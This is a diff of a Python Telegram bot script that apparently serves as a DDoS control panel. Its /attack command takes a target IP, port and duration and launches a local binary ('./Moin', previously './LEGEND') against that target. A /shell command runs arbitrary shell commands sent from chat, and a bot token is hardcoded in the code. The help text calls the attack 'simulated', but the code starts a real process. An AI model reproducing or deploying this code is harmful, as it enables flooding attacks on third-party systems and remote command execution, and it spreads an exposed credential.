@@ -1,84 +1,169 @@
+#!/usr/bin/python3
 import telebot
 import time
+import threading
 import subprocess
-import random
-from threading import Timer
+import logging
 
-# Bot token and admin information
-BOT_TOKEN = '7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ'
-ADMIN_ID = 1232047106
-OWNER_NAME = '@OWNERSRK'
-CHANNEL_LINK = 'https://youtube.com/@zeroflexislive?si=zRItV1qSr1cGoEqX'
+# Logging configuration for debugging
+logging.basicConfig(level=logging.DEBUG)
 
-# Initialize the bot
-bot = telebot.TeleBot(BOT_TOKEN)
+# Telegram bot token
+bot = telebot.TeleBot('7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ', parse_mode="HTML")
 
-# User and Group Management
-authorized_users = set([ADMIN_ID])
-allowed_groups = set([-1002322006686])  # Yahan apna group ID daalein
+# Admin user IDs
+admin_id = ["1232047106"]
 
-# Fun messages
-welcome_messages = [
-    f"Yo! Main hoon {OWNER_NAME} ka secret agent. Kya haal hai?",
-    f"Bhai! {OWNER_NAME} ka bot bol raha hoon. Ready ho sab kuch hilane ke liye?",
-    f"Aaja bhai! {OWNER_NAME} ke bot ki duniya me, idhar sirf mazedari chalegi!"
-]
+# Authorized users list
+authorized_users = []
 
-# Check if the message is from an allowed group
-def is_group_allowed(message):
-    if message.chat.id in allowed_groups:
-        return True
-    else:
-        bot.reply_to(message, "Is group ko bot use karne ki permission nahi hai! 🚫")
-        return False
+# Group and Channel details
+GROUP_ID = -1002322006686  # Group ID as an integer
+CHANNEL_ID = '@OWNERSRK'    # Channel ID as a string
 
-# Start command
-@bot.message_handler(commands=['start'])
-def start(message):
-    if not is_group_allowed(message):
-        return
-    response = random.choice(welcome_messages)
-    bot.reply_to(message, response)
+# Cooldown tracker
+user_cooldowns = {}
 
-# Add user command (Admin only)
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    if message.from_user.id == ADMIN_ID:
-        try:
-            user_id = int(message.text.split()[1])
-            authorized_users.add(user_id)
-            bot.reply_to(message, f"User {user_id} ko hamari gang me shamil kar liya! ✅")
-        except (IndexError, ValueError):
-            bot.reply_to(message, "Bhai sahi ID bhejo na! 🤨")
-    else:
-        bot.reply_to(message, "Sirf boss (admin) hi naye bande add kar sakte hain! 🚫")
+# Maximum duration and cooldown time
+MAX_DURATION = 180
+COOLDOWN_TIME = 30
 
-# Attack command with validation
-@bot.message_handler(commands=['attack'])
-def attack(message):
-    if not is_group_allowed(message):
-        return
-    
-    user_id = message.from_user.id
-    if user_id not in authorized_users:
-        bot.reply_to(message, "Are bhai! Tumhe toh permission nahi hai! 🚫")
-        return
+# YouTube Channel Promotion
+YT_PROMO = "🚀 Don't forget to subscribe to our YouTube Channel: <a href='https://www.youtube.com/@SRK'>SRK</a> for more updates!"
 
+# Function to execute shell commands asynchronously
+def execute_shell_command(command):
     try:
-        _, ip, port, duration = message.text.split()
-        duration = min(int(duration), 180)
-        command = f"./LEGEND {ip} {port} {duration}"
+        process = subprocess.Popen(command, shell=True)
+        return f"✅ Attack started: <code>{command}</code>"
+    except Exception as e:
+        return f"❌ Error executing command: {str(e)}"
 
-        try:
-            subprocess.Popen(command, shell=True)
-            bot.reply_to(message, f"Attack start! Target: {ip}:{port} for {duration} sec.")
-        except Exception as e:
-            bot.reply_to(message, f"Kuch gadbad ho gayi: {e} 😵")
+# Start Command
+@bot.message_handler(commands=['start'], chat_types=['private', 'group', 'supergroup'])
+def start(message):
+    bot.reply_to(message, f"Welcome! Type /help to see available commands.\n\nOwner: {CHANNEL_ID}")
 
-    except (IndexError, ValueError):
-        bot.reply_to(message, "Format sahi bhejo: /attack <ip> <port> <time> (Max 180 sec) ⚠️")
+# Help Command
+@bot.message_handler(commands=['help'], chat_types=['private', 'group', 'supergroup'])
+def help(message):
+    bot.reply_to(message, f"""
+<b>Available Commands:</b>
 
-# Start the bot
-print("Bot is running... 🚀")
-bot.infinity_polling()
+/start - Start the bot
+/attack [target] [port] [duration] - Simulate an attack (Admins only)
+/add [user_id] - Add an authorized user (Admins only)
+/remove [user_id] - Remove an authorized user (Admins only)
+/shell [command] - Execute a shell command (Admins only)
+/help - Show this help message
 
+Owner: {CHANNEL_ID}
+""", parse_mode="HTML")
+
+# Attack Command
+@bot.message_handler(commands=['attack'], chat_types=['group', 'supergroup'])
+def attack(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+
+    args = message.text.split()[1:]
+    if len(args) != 3:
+        bot.reply_to(message, "❌ Invalid format! Use /attack [target] [port] [duration].")
+        return
+
+    target, port, duration = args
+    try:
+        duration = int(duration)
+        if duration > MAX_DURATION:
+            bot.reply_to(message, f"❌ Duration too long! Maximum allowed is {MAX_DURATION} seconds.")
+            return
+    except ValueError:
+        bot.reply_to(message, "❌ Duration must be a number.")
+        return
+
+    user_id = message.from_user.id
+    if user_id in user_cooldowns:
+        remaining_time = round(user_cooldowns[user_id] - time.time())
+        if remaining_time > 0:
+            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before starting a new attack.")
+            return
+
+    bot.reply_to(message, f"""
+🔨 Hacking into oblivion!
+🎯 <b>Target:</b> {target}
+📜 <b>Port:</b> {port}
+⏰ <b>Duration:</b> {duration} sec
+    """, parse_mode="HTML")
+
+    threading.Thread(target=start_attack, args=(message, target, port, duration)).start()
+    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME
+
+def start_attack(message, target, port, duration):
+    full_command = f"./Moin {target} {port} {duration}"
+    result = execute_shell_command(full_command)
+    bot.reply_to(message, result)
+
+# Add User Command
+@bot.message_handler(commands=['add'], chat_types=['group', 'supergroup'])
+def add_user(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "❌ Invalid format! Use /add [user_id].")
+        return
+
+    user_id = args[0]
+    if user_id not in authorized_users:
+        authorized_users.append(user_id)
+        bot.reply_to(message, f"✅ User {user_id} has been added successfully.")
+    else:
+        bot.reply_to(message, f"❌ User {user_id} is already authorized.")
+
+# Remove User Command
+@bot.message_handler(commands=['remove'], chat_types=['group', 'supergroup'])
+def remove_user(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+
+    args = message.text.split()[1:]
+    if len(args) != 1:
+        bot.reply_to(message, "❌ Invalid format! Use /remove [user_id].")
+        return
+
+    user_id = args[0]
+    if user_id in authorized_users:
+        authorized_users.remove(user_id)
+        bot.reply_to(message, f"✅ User {user_id} has been removed successfully.")
+    else:
+        bot.reply_to(message, f"❌ User {user_id} is not authorized.")
+
+# Binary Access Shell Command
+@bot.message_handler(commands=['shell'], chat_types=['group', 'supergroup'])
+def shell(message):
+    if str(message.from_user.id) not in admin_id:
+        bot.reply_to(message, "❌ You are not authorized to use this command.")
+        return
+
+    args = message.text.split()[1:]
+    if len(args) == 0:
+        bot.reply_to(message, "❌ Invalid format! Use /shell [command].")
+        return
+
+    command = " ".join(args)
+    result = execute_shell_command(command)
+    bot.reply_to(message, f"🖥️ Shell command output:\n<code>{result}</code>", parse_mode="HTML")
+
+# Fallback Handler to log all messages
+@bot.message_handler(func=lambda message: True)
+def log_message(message):
+    logging.debug(f"Message from {message.chat.id}: {message.text}")
+
+# Run the bot with enhanced error handling
+print("Bot is running...")
+bot.polling(none_stop=True, interval=0, timeout=20)
+        
